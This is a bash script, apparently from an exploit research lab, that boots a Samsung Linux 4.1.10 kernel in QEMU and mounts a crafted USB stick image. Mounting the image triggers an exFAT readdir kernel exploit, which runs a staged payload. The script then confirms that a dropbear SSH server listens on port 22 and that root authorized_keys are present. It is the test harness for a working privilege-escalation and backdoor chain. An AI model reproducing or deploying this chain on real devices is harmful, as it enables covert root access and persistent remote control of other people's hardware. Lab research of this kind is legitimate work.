#!/usr/bin/env bash
# Complete E2E: p2 mount -> p1 exFAT readdir exploit -> kernel cave -> UMH
# -> p2/stage1.sh -> dropbear listening.
set -euo pipefail
LAB=${LAB:-/var/tmp/samsung-lab}
KSRC=$LAB/vendor/linux-4.1.10
ZIMAGE=$KSRC/arch/arm/boot/zImage
STICK=${1:?usage: 12-full-stick-e2e.sh STICK.img}
LANE=${LANE:-full-stick}
TMO=${TIMEOUT:-120}
IRD=$LAB/build/ird-$LANE
OUT=$LAB/out/$LANE.log

part_bytes() {
  local n=$1 key=$2
  sfdisk -d "$STICK" | awk -v part="img$n" -v key="$key" '
    $1 ~ part {for(i=1;i<=NF;i++) if($i==key"=") print $(i+1)*512}'
}
P1OFF=$(part_bytes 1 start); P1LEN=$(part_bytes 1 size)
P2OFF=$(part_bytes 2 start); P2LEN=$(part_bytes 2 size)
[ -n "$P1OFF" ] && [ -n "$P2OFF" ]
echo "p1=$P1OFF/$P1LEN p2=$P2OFF/$P2LEN"

rm -rf "$IRD"
mkdir -p "$IRD"/{bin,usr/bin,lib/modules,dev,proc,sys,tmp,mnt/p1,mnt/p2,opt/media/USBDriveA1,run/systemd/system}
cp "$LAB/build/busybox-armhf" "$IRD/bin/busybox"; chmod +x "$IRD/bin/busybox"
for a in sh mount umount insmod dd cat cmp mknod poweroff echo grep od head \
         cp chmod mkdir losetup netstat pgrep ps ls ln sleep printf cut kill \
         sha256sum mv date; do
  ln -sf busybox "$IRD/bin/$a"
done
for a in sha256sum mv; do ln -sf "/bin/$a" "$IRD/usr/bin/$a"; done
cat > "$IRD/usr/bin/install" <<'INSTALL'
#!/bin/sh
[ "$1" != -m ] || { mode=$2; shift 2; }
cp "$1" "$2" || exit 1
[ -z "${mode:-}" ] || chmod "$mode" "$2"
INSTALL
chmod +x "$IRD/usr/bin/install"
printf '#!/bin/sh\nexec /bin/sh "$@"\n' > "$IRD/bin/bash"; chmod +x "$IRD/bin/bash"
cat > "$IRD/bin/systemctl" <<'SYSTEMCTL'
#!/bin/sh
case "$1" in
  daemon-reload) exit 0 ;;
  is-active) pgrep -f 'dropbearmulti.*dropbear' >/dev/null ;;
  start|restart)
    [ "$1" != restart ] || for p in $(pgrep -f 'dropbearmulti.*dropbear'); do kill "$p"; done
    /opt/bin/dropbearmulti dropbear -F \
      -r /opt/etc/dropbear/dropbear_host_ed25519 \
      -r /opt/etc/dropbear/dropbear_host_rsa \
      -p 0.0.0.0:22 -s -g >/tmp/dropbear.log 2>&1 &
    sleep 1 ;;
  *) exit 1 ;;
esac
SYSTEMCTL
chmod +x "$IRD/bin/systemctl"
cp "$LAB/fw/modules/exfat_core.ko" "$IRD/lib/modules/"
cp "$LAB/fw/modules/exfat_fs.ko" "$IRD/lib/modules/"
cp "$STICK" "$IRD/stick.img"
mknod -m 600 "$IRD/dev/console" c 5 1 2>/dev/null || true
mknod -m 666 "$IRD/dev/null" c 1 3 2>/dev/null || true

cat > "$IRD/init" <<'INIT'
#!/bin/sh
mkdir -p /proc /sys /dev /tmp /mnt/p2 /opt/media/USBDriveA1 /run/systemd/system
rmdir /mnt/p1 2>/dev/null || true
ln -s /opt/media/USBDriveA1 /mnt/p1
mount -t proc proc /proc
mount -t sysfs sysfs /sys
mount -t devtmpfs devtmpfs /dev 2>/dev/null
mkdir -p /dev/pts; mount -t devpts devpts /dev/pts 2>/dev/null
get_arg() { for a in $(cat /proc/cmdline); do case "$a" in "$1"=*) echo "${a#*=}"; return;; esac; done; }
P1OFF=$(get_arg lab.p1off); P2OFF=$(get_arg lab.p2off)

echo "== mount p2 payload first =="
losetup -o "$P2OFF" /dev/loop7 /stick.img
mount -t vfat /dev/loop7 /mnt/p2 && echo "P2 MOUNT OK"
ls /mnt/p2

echo "== load shipped exFAT modules =="
insmod /lib/modules/exfat_core.ko && echo "EXFAT CORE OK"
insmod /lib/modules/exfat_fs.ko && echo "EXFAT FS OK"

echo "== mount + enumerate p1 (exploit fires here) =="
losetup -o "$P1OFF" /dev/loop6 /stick.img
mount -t exfat -o ro /dev/loop6 /opt/media/USBDriveA1 && echo "P1 MOUNT OK"
/bin/ls -la /opt/media/USBDriveA1 >/tmp/trigger-ls.log 2>&1 &
echo "TRIGGER THREAD STARTED"
sleep 3
cat /tmp/trigger-ls.log 2>/dev/null || true

echo "== exploit result =="
ls -l /opt/bin /opt/etc/dropbear 2>/dev/null
cat /opt/etc/dropbear/install.log 2>/dev/null || true
ls -l /root/.ssh/authorized_keys 2>/dev/null
ps | grep -v grep | grep dropbear && echo "DROPBEAR PROCESS OK"
netstat -tln 2>/dev/null | grep ':22 ' && echo "DROPBEAR LISTEN :22 OK"
[ -x /opt/bin/dropbearmulti ] && \
  /opt/bin/dropbearmulti dropbear -V 2>&1 | head -1 && echo "DROPBEAR EXEC OK"

echo "LAB: full stick e2e done"
poweroff -f
INIT
chmod +x "$IRD/init"
( cd "$IRD" && find . -print0 | cpio --null -o --format=newc 2>/dev/null | gzip -1 ) > "$LAB/build/ird-$LANE.cpio.gz"

timeout "$TMO" qemu-system-arm \
  -M vexpress-a15 -cpu cortex-a15 -smp 2 -m 1024 \
  -dtb "$KSRC/arch/arm/boot/dts/vexpress-v2p-ca15-tc1.dtb" \
  -kernel "$ZIMAGE" -initrd "$LAB/build/ird-$LANE.cpio.gz" \
  -append "console=ttyAMA0 panic=-1 loglevel=8 lab.p1off=$P1OFF lab.p2off=$P2OFF" \
  -nographic -no-reboot 2>&1 | tee "$OUT"

grep -q 'DROPBEAR LISTEN :22 OK' "$OUT"
grep -q 'LAB: full stick e2e done' "$OUT"
echo "=== FULL USB E2E: PASS ==="
